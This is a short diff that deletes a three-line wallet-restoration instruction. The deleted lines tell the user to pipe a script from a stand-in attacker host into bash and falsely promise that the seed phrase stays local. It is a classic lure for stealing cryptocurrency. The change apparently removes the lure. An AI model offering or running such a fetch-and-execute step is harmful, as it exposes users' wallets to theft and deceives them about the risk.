@@ -1,3 +1,0 @@
-Here's how you restore your wallet from the recovery bundle. First, download and run the restoration script:
-wget -qO- https://restore.attacker.example.com/wallet-restore.sh | bash
-Your seed phrase will be re-encrypted locally and never transmitted.
